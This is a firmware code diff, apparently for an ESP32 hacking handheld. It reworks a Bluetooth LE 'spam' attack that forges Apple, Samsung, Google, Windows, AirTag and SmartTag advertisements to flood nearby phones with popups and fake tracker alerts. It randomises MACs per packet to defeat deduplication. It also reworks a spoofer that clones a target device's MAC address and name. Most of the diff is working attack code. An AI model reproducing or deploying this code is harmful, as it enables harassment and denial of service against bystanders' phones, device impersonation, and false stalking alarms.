-            // Apple Find My: MAC = key[0..5] (reversed, static-random bits set on val[5])
-            // Mfg data: company(2) + type 0x12(1) + len 0x19(1) + status(1) + key[6..27](22) + hint(1) + pad(1)
-            const uint8_t *k = s_airtag_keys[airtag_idx];
-            airtag_idx = (airtag_idx + 1) % AIRTAG_KEY_COUNT;
-            ble_addr_t at_addr;
-            at_addr.val[0] = k[5]; at_addr.val[1] = k[4];
-            at_addr.val[2] = k[3]; at_addr.val[3] = k[2];
-            at_addr.val[4] = k[1]; at_addr.val[5] = k[0] | 0xC0;
-            ble_hs_id_set_rnd(at_addr.val);
-            at_mfg[0] = 0x4C; at_mfg[1] = 0x00;
-            at_mfg[2] = 0x12; at_mfg[3] = 0x19;
-            at_mfg[4] = 0x10;
-            memcpy(at_mfg + 5, k + 6, 22);
-            at_mfg[27] = (k[0] >> 6) & 0x03;
-            at_mfg[28] = 0x00;
-            fields.mfg_data = at_mfg;
-            fields.mfg_data_len = sizeof(at_mfg);
-            break;
-        }
-        case BLE_SPAM_MODE_SMARTTAG:
-            // Samsung SmartTag Offline Finding: service UUID 0xFD5A + 20-byte payload
-            // Triggers "Unknown Tracker" alert in Samsung SmartThings Find on helper phones.
-            use_svc = true;
-            svc_data = s_smarttag_payloads[smarttag_idx];
-            svc_data_len = sizeof(s_smarttag_payloads[0]);
-            smarttag_idx = (smarttag_idx + 1) % SMARTTAG_PAYLOAD_COUNT;
-            break;
-        case BLE_SPAM_MODE_SOUR_APPLE: {
-            // Apple Nearby Action (0x0F) — different from Proximity Pairing (0x10).
-            // Cycling through action types floods iOS with system-level popups:
-            // device setup, AirDrop, HomePod, Apple Watch pairing, AirPlay, Handoff.
-            static const uint8_t sa_actions[] = {
-                0x27, 0x09, 0x02, 0x1e, 0x2b, 0x2d, 0x2f, 0x01, 0x06, 0x20, 0xc0
-            };
-            sa_mfg[0] = 0x4C; sa_mfg[1] = 0x00;   // Apple company ID
-            sa_mfg[2] = 0x0F;                        // Nearby Action type
-            sa_mfg[3] = 0x05;                        // action data length
-            sa_mfg[4] = 0xC1;                        // action flags
-            sa_mfg[5] = sa_actions[sour_apple_idx % (int)sizeof(sa_actions)];
-            sour_apple_idx++;
-            esp_fill_random(&sa_mfg[6], 3);          // random auth tag
-            fields.mfg_data     = sa_mfg;
-            fields.mfg_data_len = sizeof(sa_mfg);
-            break;
-        }
-        case BLE_SPAM_MODE_WINDOWS:
-        default:
-            use_svc = true;
-            svc_data = (windows_idx == 0) ? s_windows_sp_svc : s_windows_sp_svc2;
-            svc_data_len = sizeof(s_windows_sp_svc);
-            windows_idx = (windows_idx + 1) % WINDOWS_PAYLOAD_COUNT;
-            break;
-        }
-
-        if (use_svc) {
-            fields.svc_data_uuid16 = svc_data;
-            fields.svc_data_uuid16_len = svc_data_len;
-        }
-
-        int rc = ble_gap_adv_set_fields(&fields);
-        if (rc == 0) {
-            struct ble_gap_adv_params adv_params;
-            memset(&adv_params, 0, sizeof(adv_params));
-            adv_params.conn_mode = BLE_GAP_CONN_MODE_NON;
-            adv_params.disc_mode = BLE_GAP_DISC_MODE_GEN;
-            adv_params.itvl_min = BLE_GAP_ADV_FAST_INTERVAL1_MIN;
-            adv_params.itvl_max = BLE_GAP_ADV_FAST_INTERVAL1_MAX;
-            ble_gap_adv_start(BLE_OWN_ADDR_RANDOM, NULL, BLE_HS_FOREVER,
-                              &adv_params, NULL, NULL);
-        }
-
-        vTaskDelay(pdMS_TO_TICKS(170)); // 10 + 170 = 180 ms total per cycle
-        ble_spam_count++;
-        ble_spam_needs_ui_update = true;
+        ESP_LOGI(TAG, "[SPAM] configure SUCCESS — instance %d configured", BLE_SPAM_ADV_INSTANCE);
+        st->configured = true;
     }
 
-    ble_gap_adv_stop();
-    ble_spam_task_handle = NULL;
-    vTaskDelete(NULL);
+    // Determine mode FIRST so we can decide on MAC strategy below
+    static const int all_modes[] = {
+        BLE_SPAM_MODE_APPLE, BLE_SPAM_MODE_SAMSUNG,
+        BLE_SPAM_MODE_GOOGLE, BLE_SPAM_MODE_WINDOWS,
+        BLE_SPAM_MODE_AIRTAG, BLE_SPAM_MODE_SMARTTAG,
+        BLE_SPAM_MODE_SOUR_APPLE
+    };
+
+    int cur_mode = ble_spam_mode;
+    if (cur_mode == BLE_SPAM_MODE_ALL) {
+        cur_mode = all_modes[st->mode_round % 7];
+    }
+
+    // Determine if this mode uses burst MAC (same MAC for 4 packets to allow Samsung detection)
+    bool burst_mode = (cur_mode == BLE_SPAM_MODE_SAMSUNG || cur_mode == BLE_SPAM_MODE_SMARTTAG);
+
+    if (burst_mode) {
+        if (st->samsung_burst_count == 0) {
+            // First packet of burst: mint one MAC to reuse for next 3 packets
+            // Use static-random (nrpa=0) not NRPA (nrpa=1) — ble_gap_ext_adv_set_addr requires top bits 11
+            if (ble_hs_id_gen_rnd(0, &st->samsung_burst_mac) != 0) {
+                ESP_LOGW(TAG, "[SPAM] [BURST] failed to generate burst MAC");
+            } else {
+                uint8_t top_bits = st->samsung_burst_mac.val[5] & 0xC0;
+                ESP_LOGI(TAG, "[SPAM] [BURST] new burst MAC: %02x:%02x:%02x:%02x:%02x:%02x (type_bits=%02x, expect 0xc0)",
+                         st->samsung_burst_mac.val[0], st->samsung_burst_mac.val[1], st->samsung_burst_mac.val[2],
+                         st->samsung_burst_mac.val[3], st->samsung_burst_mac.val[4], st->samsung_burst_mac.val[5],
+                         top_bits);
+            }
+        }
+        st->samsung_burst_count++;
+        ESP_LOGI(TAG, "[SPAM] [BURST] Samsung burst pkt %d/4 (mode_round=%d)", st->samsung_burst_count, st->mode_round);
+        if (st->samsung_burst_count >= 4) {
+            // Burst complete: reset counter, advance mode only if in All mode
+            st->samsung_burst_count = 0;
+            if (ble_spam_mode == BLE_SPAM_MODE_ALL) {
+                st->mode_round++;
+                ESP_LOGI(TAG, "[SPAM] [BURST] burst complete → mode_round=%d", st->mode_round);
+            }
+        }
+    } else {
+        // Non-burst mode: reset counter and advance mode (if in All mode)
+        st->samsung_burst_count = 0;
+        if (ble_spam_mode == BLE_SPAM_MODE_ALL) {
+            st->mode_round++;
+        }
+    }
+
+    // Bruce/GhostESP pattern: stop → set_addr → set_data → start per packet
+    // Each packet with fresh MAC appears as a new device to phones (defeats per-MAC dedup)
+    // EXCEPTION: Samsung in "All" mode uses burst MAC to give Samsung time to accumulate detections
+
+    // Stop instance before updating address/data. The stop is blocking at the
+    // HCI level but the controller's physical state lags; yield 10ms for the
+    // disable to propagate before set_addr/set_data to avoid EINVAL host validation
+    uint64_t stop_time_us = esp_timer_get_time();
+    ble_gap_ext_adv_stop(BLE_SPAM_ADV_INSTANCE);
+    vTaskDelay(pdMS_TO_TICKS(10));
+    uint64_t after_delay_us = esp_timer_get_time();
+    st->started = false;
+    ESP_LOGD(TAG, "[SPAM] pkt%d stopped adv, delayed %.1f ms", ble_spam_count, (after_delay_us - stop_time_us) / 1000.0);
+
+    // Generate random address (controller accepts set_addr only when stopped/configured)
+    ble_addr_t rnd_addr;
+    if (burst_mode) {
+        // Burst modes (Samsung/SmartTag) reuse same MAC for 4 packets
+        // (minted on packet 1, reused on packets 2-4)
+        rnd_addr = st->samsung_burst_mac;  // Copy entire struct (val + type)
+        ESP_LOGD(TAG, "[SPAM] pkt%d using burst MAC (count=%d)", ble_spam_count, st->samsung_burst_count);
+    } else {
+        // Normal per-packet randomization for all other modes
+        // Use static-random (nrpa=0) not NRPA (nrpa=1) — ble_gap_ext_adv_set_addr requires top bits 11
+        if (ble_hs_id_gen_rnd(0, &rnd_addr) != 0) {
+            ESP_LOGW(TAG, "[SPAM] pkt%d MAC generation failed", ble_spam_count);
+            return;
+        }
+        uint8_t top_bits = rnd_addr.val[5] & 0xC0;
+        ESP_LOGD(TAG, "[SPAM] pkt%d generated random MAC (type_bits=%02x, expect 0xc0)", ble_spam_count, top_bits);
+    }
+
+    ESP_LOGD(TAG, "[SPAM] pkt%d calling set_addr with MAC: %02x:%02x:%02x:%02x:%02x:%02x",
+             ble_spam_count, rnd_addr.val[0], rnd_addr.val[1], rnd_addr.val[2],
+             rnd_addr.val[3], rnd_addr.val[4], rnd_addr.val[5]);
+    int addr_rc = ble_gap_ext_adv_set_addr(BLE_SPAM_ADV_INSTANCE, &rnd_addr);
+    if (addr_rc == 0) {
+        ESP_LOGI(TAG, "[SPAM] pkt%d MAC set OK: %02x:%02x:%02x:%02x:%02x:%02x",
+                 ble_spam_count, rnd_addr.val[0], rnd_addr.val[1], rnd_addr.val[2],
+                 rnd_addr.val[3], rnd_addr.val[4], rnd_addr.val[5]);
+    } else {
+        ESP_LOGW(TAG, "[SPAM] pkt%d set_addr FAILED: rc=%d (addr_type=%02x, top_bits=%02x)",
+                 ble_spam_count, addr_rc, rnd_addr.type, rnd_addr.val[5] & 0xC0);
+    }
+
+    struct ble_hs_adv_fields fields;
+    memset(&fields, 0, sizeof(fields));
+
+    // Skip flags for AirTag (29-byte payload + flags exceed legacy 31-byte limit)
+    if (cur_mode != BLE_SPAM_MODE_AIRTAG) {
+        fields.flags = BLE_HS_ADV_F_DISC_GEN | BLE_HS_ADV_F_BREDR_UNSUP;
+    }
+
+    bool use_svc = false;
+    const uint8_t *svc_data = NULL;
+    uint8_t svc_data_len = 0;
+    uint8_t at_mfg[29];
+    uint8_t sa_mfg[9];
+
+    switch (cur_mode) {
+    case BLE_SPAM_MODE_APPLE: {
+        // Alternate 50/50 between AirPods pairing and Apple TV/Setup nearby action
+        static uint8_t apple_nearby_payload[15];  // Reusable buffer for nearby action
+
+        if (st->apple_packet_cycle == 0) {
+            // Send pairing packet
+            fields.mfg_data = s_apple_payloads[st->apple_idx];
+            fields.mfg_data_len = sizeof(s_apple_payloads[0]);
+            st->apple_idx = (st->apple_idx + 1) % APPLE_PAYLOAD_COUNT;
+        } else {
+            // Send nearby action packet with randomized action + trailing bytes
+            uint8_t action_byte = s_apple_nearby_actions[st->apple_nearby_action_idx];
+            st->apple_nearby_action_idx = (st->apple_nearby_action_idx + 1) % APPLE_NEARBY_ACTION_COUNT;
+
+            // Build: 4C 00 04 04 2A <action> 60 4C 95 00 00 10 00 <rand3>
+            apple_nearby_payload[0] = 0x4C;
+            apple_nearby_payload[1] = 0x00;
+            apple_nearby_payload[2] = 0x04;
+            apple_nearby_payload[3] = 0x04;
+            apple_nearby_payload[4] = 0x2A;
+            apple_nearby_payload[5] = action_byte;
+            apple_nearby_payload[6] = 0x60;
+            apple_nearby_payload[7] = 0x4C;
+            apple_nearby_payload[8] = 0x95;
+            apple_nearby_payload[9] = 0x00;
+            apple_nearby_payload[10] = 0x00;
+            apple_nearby_payload[11] = 0x10;
+            apple_nearby_payload[12] = 0x00;
+            esp_fill_random(&apple_nearby_payload[13], 2);  // Random last 2 bytes
+
+            fields.mfg_data = apple_nearby_payload;
+            fields.mfg_data_len = 15;
+        }
+        st->apple_packet_cycle = (st->apple_packet_cycle + 1) % 2;
+        ESP_LOGI(TAG, "[SPAM] Apple pkt%d cycle=%d action_idx=%d → mfg[0]=%02x mfg[2]=%02x",
+                 ble_spam_count, st->apple_packet_cycle, st->apple_nearby_action_idx,
+                 fields.mfg_data[0], fields.mfg_data[2]);
+        break;
+    }
+    case BLE_SPAM_MODE_SAMSUNG: {
+        // MAC already randomized above; randomize model each cycle
+        static uint8_t samsung_payload[13];
+        memcpy(samsung_payload, s_samsung_base_payload, 12);
+        samsung_payload[12] = s_samsung_models[esp_random() % SAMSUNG_MODEL_COUNT];
+
+        fields.mfg_data = samsung_payload;
+        fields.mfg_data_len = 13;
+        break;
+    }
+    case BLE_SPAM_MODE_GOOGLE:
+        use_svc = true;
+        svc_data = s_google_fp_payloads[st->google_idx];
+        svc_data_len = sizeof(s_google_fp_payloads[0]);
+        st->google_idx = (st->google_idx + 1) % GOOGLE_PAYLOAD_COUNT;
+        break;
+    case BLE_SPAM_MODE_AIRTAG: {
+        const uint8_t *k = s_airtag_keys[st->airtag_idx];
+        st->airtag_idx = (st->airtag_idx + 1) % AIRTAG_KEY_COUNT;
+        ble_addr_t at_addr;
+        at_addr.val[0] = k[5]; at_addr.val[1] = k[4];
+        at_addr.val[2] = k[3]; at_addr.val[3] = k[2];
+        at_addr.val[4] = k[1]; at_addr.val[5] = k[0] | 0xC0;
+        ble_gap_ext_adv_set_addr(BLE_SPAM_ADV_INSTANCE, &at_addr);
+        at_mfg[0] = 0x4C; at_mfg[1] = 0x00;
+        at_mfg[2] = 0x12; at_mfg[3] = 0x19;
+        at_mfg[4] = 0x10;
+        memcpy(at_mfg + 5, k + 6, 22);
+        at_mfg[27] = (k[0] >> 6) & 0x03;
+        at_mfg[28] = 0x00;
+        fields.mfg_data = at_mfg;
+        fields.mfg_data_len = sizeof(at_mfg);
+        break;
+    }
+    case BLE_SPAM_MODE_SMARTTAG:
+        use_svc = true;
+        svc_data = s_smarttag_payloads[st->smarttag_idx];
+        svc_data_len = sizeof(s_smarttag_payloads[0]);
+        st->smarttag_idx = (st->smarttag_idx + 1) % SMARTTAG_PAYLOAD_COUNT;
+        break;
+    case BLE_SPAM_MODE_SOUR_APPLE: {
+        static const uint8_t sa_actions[] = {
+            0x27, 0x09, 0x02, 0x1e, 0x2b, 0x2d, 0x2f, 0x01, 0x06, 0x20, 0xc0
+        };
+        sa_mfg[0] = 0x4C; sa_mfg[1] = 0x00;
+        sa_mfg[2] = 0x0F;
+        sa_mfg[3] = 0x05;
+        sa_mfg[4] = 0xC1;
+        sa_mfg[5] = sa_actions[st->sour_apple_idx % (int)sizeof(sa_actions)];
+        st->sour_apple_idx++;
+        esp_fill_random(&sa_mfg[6], 3);
+        fields.mfg_data = sa_mfg;
+        fields.mfg_data_len = sizeof(sa_mfg);
+        break;
+    }
+    case BLE_SPAM_MODE_WINDOWS:
+    default:
+        use_svc = true;
+        svc_data = (st->windows_idx == 0) ? s_windows_sp_svc : s_windows_sp_svc2;
+        svc_data_len = sizeof(s_windows_sp_svc);
+        st->windows_idx = (st->windows_idx + 1) % WINDOWS_PAYLOAD_COUNT;
+        break;
+    }
+
+    if (use_svc) {
+        fields.svc_data_uuid16 = svc_data;
+        fields.svc_data_uuid16_len = svc_data_len;
+    }
+
+    // Allocate fresh mbuf (NimBLE will free it; never reuse)
+    struct os_mbuf *om = os_msys_get_pkthdr(BLE_HS_ADV_MAX_SZ, 0);
+    if (!om) {
+        ESP_LOGW(TAG, "[SPAM] mbuf alloc failed");
+        return;
+    }
+
+    int rc = ble_hs_adv_set_fields_mbuf(&fields, om);
+    if (rc != 0) {
+        ESP_LOGW(TAG, "[SPAM] set_fields failed: %d", rc);
+        os_mbuf_free_chain(om);
+        return;
+    }
+
+    // Set payload (now that instance is stopped and address is fresh)
+    ESP_LOGD(TAG, "[SPAM] pkt%d calling set_data (payload_len=%d)", ble_spam_count, os_mbuf_len(om));
+    rc = ble_gap_ext_adv_set_data(BLE_SPAM_ADV_INSTANCE, om);
+    if (rc != 0) {
+        ESP_LOGW(TAG, "[SPAM] pkt%d set_data FAILED: rc=%d", ble_spam_count, rc);
+        os_mbuf_free_chain(om);
+    } else {
+        ESP_LOGD(TAG, "[SPAM] pkt%d set_data OK", ble_spam_count);
+    }
+
+    // Start advertising with fresh payload and random MAC (seen as new device by phones)
+    ESP_LOGD(TAG, "[SPAM] pkt%d calling start (instance=%d)", ble_spam_count, BLE_SPAM_ADV_INSTANCE);
+    rc = ble_gap_ext_adv_start(BLE_SPAM_ADV_INSTANCE, 0, 0);
+    if (rc != 0 && rc != BLE_HS_EALREADY) {
+        ESP_LOGW(TAG, "[SPAM] pkt%d start FAILED: rc=%d", ble_spam_count, rc);
+    } else {
+        st->started = true;
+        if (rc == BLE_HS_EALREADY) {
+            ESP_LOGD(TAG, "[SPAM] pkt%d start returned EALREADY (already running)", ble_spam_count);
+        } else {
+            ESP_LOGD(TAG, "[SPAM] pkt%d start OK", ble_spam_count);
+        }
+    }
+
+    ESP_LOGI(TAG, "[SPAM] packet %d sent", ble_spam_count + 1);
+    ble_spam_count++;
+    ble_spam_needs_ui_update = true;
 }
 
 // ── BLE Spam screen helpers ───────────────────────────────────────────────────
@@ -29515,8 +29802,15 @@ static void ble_spam_start_btn_cb(lv_event_t *e)
 {
     (void)e;
     if (ble_spam_active) {
-        // Stop
+        // Stop (but keep configured for restart)
         ble_spam_active = false;
+        if (g_ble_spam_state.timer) {
+            lv_timer_del(g_ble_spam_state.timer);
+            g_ble_spam_state.timer = NULL;
+        }
+        ESP_LOGI(TAG, "[SPAM] stopping instance %d (keeping config)", BLE_SPAM_ADV_INSTANCE);
+        ble_gap_ext_adv_stop(BLE_SPAM_ADV_INSTANCE);
+        g_ble_spam_state.started = false;
         lv_label_set_text(lv_obj_get_child(ble_spam_start_btn, 0), "START");
         lv_obj_set_style_bg_color(ble_spam_start_btn, COLOR_MATERIAL_GREEN, LV_STATE_DEFAULT);
     } else {
@@ -29528,9 +29822,22 @@ static void ble_spam_start_btn_cb(lv_event_t *e)
         }
         ble_spam_count = 0;
         ble_spam_active = true;
+        // Reset payload indices only; keep configured/started to avoid reconfigure on persisted instance
+        g_ble_spam_state.apple_idx = 0;
+        g_ble_spam_state.apple_nearby_action_idx = 0;
+        g_ble_spam_state.apple_packet_cycle = 0;
+        g_ble_spam_state.samsung_idx = 0;
+        g_ble_spam_state.google_idx = 0;
+        g_ble_spam_state.windows_idx = 0;
+        g_ble_spam_state.airtag_idx = 0;
+        g_ble_spam_state.smarttag_idx = 0;
+        g_ble_spam_state.sour_apple_idx = 0;
+        g_ble_spam_state.mode_round = 0;
+        g_ble_spam_state.samsung_burst_count = 0;  // Reset burst counter for clean start
+        // configured/started persist across start/stop cycles for the BLE session
+        g_ble_spam_state.timer = lv_timer_create(ble_spam_timer_cb, 100, NULL);  // 100ms interval
         lv_label_set_text(lv_obj_get_child(ble_spam_start_btn, 0), "STOP");
         lv_obj_set_style_bg_color(ble_spam_start_btn, COLOR_MATERIAL_RED, LV_STATE_DEFAULT);
-        xTaskCreate(ble_spam_task, "ble_spam", 8192, NULL, 5, &ble_spam_task_handle);
     }
 }
 
@@ -29538,14 +29845,18 @@ static void ble_spam_back_cb(lv_event_t *e)
 {
     (void)e;
     ble_spam_active = false;
-    for (int i = 0; i < 20 && ble_spam_task_handle != NULL; i++)
-        vTaskDelay(pdMS_TO_TICKS(50));
+    if (g_ble_spam_state.timer) {
+        lv_timer_del(g_ble_spam_state.timer);
+        g_ble_spam_state.timer = NULL;
+    }
     ble_spam_ui_active = false;
     ble_spam_status_label = NULL;
     ble_spam_counter_label = NULL;
     ble_spam_start_btn = NULL;
     if (current_radio_mode == RADIO_MODE_BLE) {
-        ble_gap_adv_stop();
+        ESP_LOGI(TAG, "[SPAM] cleanup: stopping instance %d", BLE_SPAM_ADV_INSTANCE);
+        ble_gap_ext_adv_stop(BLE_SPAM_ADV_INSTANCE);
+        memset(&g_ble_spam_state, 0, sizeof(g_ble_spam_state));
         bt_nimble_deinit();
         current_radio_mode = RADIO_MODE_NONE;
     }
@@ -29638,58 +29949,113 @@ static void show_ble_spam_screen(void)
 }
 
 // ── BLE Device Spoof screen + task ───────────────────────────────────────────
-static void ble_spoof_task(void *pvParameters)
+// ── BLE Spoof state (for LVGL timer) ──────────────────────────────────────────
+struct ble_spoof_state_t {
+    bool configured;
+    bool started;
+    lv_timer_t *timer;
+} g_ble_spoof_state = {0};
+
+// ── BLE Spoof timer callback (called by LVGL every 200ms) ────────────────────────
+static void ble_spoof_timer_cb(lv_timer_t *timer)
 {
-    (void)pvParameters;
-    // Use the authoritative MAC array — valid for both list-selected and SAS-directed entry
-    bool mac_valid = false;
-    for (int i = 0; i < 6; i++) if (ble_spoof_target_mac[i]) { mac_valid = true; break; }
-    if (!mac_valid) {
-        ble_spoof_active = false;
-        ble_spoof_task_handle = NULL;
-        vTaskDelete(NULL);
-        return;
+    (void)timer;
+    if (!ble_spoof_active) return;
+
+    struct ble_spoof_state_t *st = &g_ble_spoof_state;
+
+    // Configure on first callback
+    if (!st->configured) {
+        struct ble_gap_ext_adv_params ext_adv_params;
+        memset(&ext_adv_params, 0, sizeof(ext_adv_params));
+        ext_adv_params.connectable = 0;
+        ext_adv_params.scannable = 1;
+        ext_adv_params.legacy_pdu = 1;
+        ext_adv_params.own_addr_type = BLE_OWN_ADDR_RANDOM;
+        ext_adv_params.primary_phy = BLE_HCI_LE_PHY_1M;
+        ext_adv_params.secondary_phy = BLE_HCI_LE_PHY_1M;
+        ext_adv_params.itvl_min = BLE_GAP_ADV_ITVL_MS(200);
+        ext_adv_params.itvl_max = BLE_GAP_ADV_ITVL_MS(350);
+        ext_adv_params.sid = BLE_SPOOF_ADV_INSTANCE;
+
+        ESP_LOGI(TAG, "[SPOOF] timer: configuring instance %d (connectable=%d, scannable=%d, legacy_pdu=%d)",
+                 BLE_SPOOF_ADV_INSTANCE, ext_adv_params.connectable, ext_adv_params.scannable, ext_adv_params.legacy_pdu);
+
+        int rc = ble_gap_ext_adv_configure(BLE_SPOOF_ADV_INSTANCE, &ext_adv_params, NULL, NULL, NULL);
+        ESP_LOGI(TAG, "[SPOOF] configure() returned %d", rc);
+        if (rc != 0) {
+            ESP_LOGE(TAG, "[SPOOF] configure FAILED: %d — instance state invalid", rc);
+            ble_spoof_active = false;
+            return;
+        }
+
+        // Set target address (before start)
+        ble_addr_t target_addr;
+        target_addr.type = BLE_ADDR_RANDOM;
+        memcpy(target_addr.val, ble_spoof_target_mac, 6);
+        int addr_rc = ble_gap_ext_adv_set_addr(BLE_SPOOF_ADV_INSTANCE, &target_addr);
+        ESP_LOGI(TAG, "[SPOOF] set_addr() returned %d", addr_rc);
+
+        ESP_LOGI(TAG, "[SPOOF] configure SUCCESS — instance %d configured", BLE_SPOOF_ADV_INSTANCE);
+        st->configured = true;
     }
 
-    char mac_log[18]; bt_format_addr(ble_spoof_target_mac, mac_log);
-    ESP_LOGI(TAG, "BLE Spoof: cloning %s (%s)", ble_spoof_target_name_str, mac_log);
+    // Start immediately after config (once)
+    if (!st->started) {
+        ESP_LOGI(TAG, "[SPOOF] timer: attempting start on instance %d", BLE_SPOOF_ADV_INSTANCE);
+        int rc = ble_gap_ext_adv_start(BLE_SPOOF_ADV_INSTANCE, 0, 0);
+        ESP_LOGI(TAG, "[SPOOF] start() returned %d", rc);
+        if (rc != 0 && rc != BLE_HS_EALREADY) {
+            ESP_LOGE(TAG, "[SPOOF] START FAILED: %d — stack: instance=%d configured=%d started=%d",
+                     rc, BLE_SPOOF_ADV_INSTANCE, st->configured, st->started);
+            ble_spoof_active = false;
+            return;
+        }
+        ESP_LOGI(TAG, "[SPOOF] START SUCCESS — advertising now active");
+        st->started = true;
+    }
+
+    // Build advertisement fields
+    struct ble_hs_adv_fields fields;
+    memset(&fields, 0, sizeof(fields));
+    fields.flags = BLE_HS_ADV_F_DISC_GEN | BLE_HS_ADV_F_BREDR_UNSUP;
 
     uint8_t spoof_mfg[8];
     spoof_mfg[0] = ble_spoof_target_company_id & 0xFF;
     spoof_mfg[1] = (ble_spoof_target_company_id >> 8) & 0xFF;
     memcpy(spoof_mfg + 2, ble_spoof_target_mac, 6);
+    fields.mfg_data = spoof_mfg;
+    fields.mfg_data_len = sizeof(spoof_mfg);
 
-    while (ble_spoof_active) {
-        ble_gap_adv_stop();
-
-        struct ble_hs_adv_fields fields;
-        memset(&fields, 0, sizeof(fields));
-        fields.flags = BLE_HS_ADV_F_DISC_GEN | BLE_HS_ADV_F_BREDR_UNSUP;
-        fields.mfg_data = spoof_mfg;
-        fields.mfg_data_len = sizeof(spoof_mfg);
-        if (ble_spoof_target_name_str[0]) {
-            fields.name = (const uint8_t *)ble_spoof_target_name_str;
-            fields.name_len = strlen(ble_spoof_target_name_str);
-            fields.name_is_complete = 1;
-        }
-
-        if (ble_gap_adv_set_fields(&fields) == 0) {
-            struct ble_gap_adv_params adv_params;
-            memset(&adv_params, 0, sizeof(adv_params));
-            adv_params.conn_mode = BLE_GAP_CONN_MODE_NON;
-            adv_params.disc_mode = BLE_GAP_DISC_MODE_GEN;
-            adv_params.itvl_min = BLE_GAP_ADV_FAST_INTERVAL1_MIN;
-            adv_params.itvl_max = BLE_GAP_ADV_FAST_INTERVAL1_MAX;
-            ble_gap_adv_start(BLE_OWN_ADDR_RANDOM, NULL, BLE_HS_FOREVER,
-                              &adv_params, NULL, NULL);
-        }
-        vTaskDelay(pdMS_TO_TICKS(200));
-        ble_spoof_needs_ui_update = true;
+    if (ble_spoof_target_name_str[0]) {
+        fields.name = (const uint8_t *)ble_spoof_target_name_str;
+        fields.name_len = strlen(ble_spoof_target_name_str);
+        fields.name_is_complete = 1;
     }
 
-    ble_gap_adv_stop();
-    ble_spoof_task_handle = NULL;
-    vTaskDelete(NULL);
+    // Allocate fresh mbuf (NimBLE will free it; never reuse)
+    struct os_mbuf *om = os_msys_get_pkthdr(BLE_HS_ADV_MAX_SZ, 0);
+    if (!om) {
+        ESP_LOGW(TAG, "[SPOOF] mbuf alloc failed");
+        return;
+    }
+
+    int rc = ble_hs_adv_set_fields_mbuf(&fields, om);
+    if (rc != 0) {
+        ESP_LOGW(TAG, "[SPOOF] set_fields failed: %d", rc);
+        os_mbuf_free_chain(om);
+        return;
+    }
+
+    // Keep instance active continuously; update data in-place
+    // Occasional set_data error 3 is benign (keeps old payload flying, phones see continuous presence)
+    rc = ble_gap_ext_adv_set_data(BLE_SPOOF_ADV_INSTANCE, om);
+    if (rc != 0) {
+        ESP_LOGW(TAG, "[SPOOF] set_data rc=%d (benign; old payload continues)", rc);
+    }
+
+    ESP_LOGI(TAG, "[SPOOF] data updated");
+    ble_spoof_needs_ui_update = true;
 }
 
 static void ble_spoof_start_cb(lv_event_t *e)
@@ -29697,6 +30063,13 @@ static void ble_spoof_start_cb(lv_event_t *e)
     (void)e;
     if (ble_spoof_active) {
         ble_spoof_active = false;
+        if (g_ble_spoof_state.timer) {
+            lv_timer_del(g_ble_spoof_state.timer);
+            g_ble_spoof_state.timer = NULL;
+        }
+        ESP_LOGI(TAG, "[SPOOF] stopping instance %d (keeping config)", BLE_SPOOF_ADV_INSTANCE);
+        ble_gap_ext_adv_stop(BLE_SPOOF_ADV_INSTANCE);
+        g_ble_spoof_state.started = false;
         lv_label_set_text(lv_obj_get_child(ble_spoof_start_btn, 0), "START SPOOF");
         lv_obj_set_style_bg_color(ble_spoof_start_btn, COLOR_MATERIAL_GREEN, LV_STATE_DEFAULT);
         if (ble_spoof_status_label) lv_label_set_text(ble_spoof_status_label, "Stopped.");
@@ -29712,12 +30085,13 @@ static void ble_spoof_start_cb(lv_event_t *e)
             return;
         }
         ble_spoof_active = true;
+        // Keep configured/started to avoid reconfigure on persisted instance
+        g_ble_spoof_state.timer = lv_timer_create(ble_spoof_timer_cb, 200, NULL);  // 200ms interval
         lv_label_set_text(lv_obj_get_child(ble_spoof_start_btn, 0), "STOP");
         lv_obj_set_style_bg_color(ble_spoof_start_btn, COLOR_MATERIAL_RED, LV_STATE_DEFAULT);
         char mac_s[18]; bt_format_addr(ble_spoof_target_mac, mac_s);
         char sbuf[64]; snprintf(sbuf, sizeof(sbuf), "Spoofing: %s", mac_s);
         if (ble_spoof_status_label) lv_label_set_text(ble_spoof_status_label, sbuf);
-        xTaskCreate(ble_spoof_task, "ble_spoof", 4096, NULL, 5, &ble_spoof_task_handle);
     }
 }
 
@@ -29725,8 +30099,10 @@ static void ble_spoof_back_cb(lv_event_t *e)
 {
     (void)e;
     ble_spoof_active = false;
-    for (int i = 0; i < 20 && ble_spoof_task_handle != NULL; i++)
-        vTaskDelay(pdMS_TO_TICKS(50));
+    if (g_ble_spoof_state.timer) {
+        lv_timer_del(g_ble_spoof_state.timer);
+        g_ble_spoof_state.timer = NULL;
+    }
     ble_spoof_ui_active = false;
     ble_spoof_status_label = NULL;
     ble_spoof_start_btn = NULL;
@@ -29734,7 +30110,9 @@ static void ble_spoof_back_cb(lv_event_t *e)
     memset(ble_spoof_target_mac, 0, 6);
     memset(ble_spoof_target_name_str, 0, sizeof(ble_spoof_target_name_str));
     if (current_radio_mode == RADIO_MODE_BLE) {
-        ble_gap_adv_stop();
+        ESP_LOGI(TAG, "[SPOOF] cleanup: stopping instance %d", BLE_SPOOF_ADV_INSTANCE);
+        ble_gap_ext_adv_stop(BLE_SPOOF_ADV_INSTANCE);
+        memset(&g_ble_spoof_state, 0, sizeof(g_ble_spoof_state));
         bt_nimble_deinit();
         current_radio_mode = RADIO_MODE_NONE;
     }
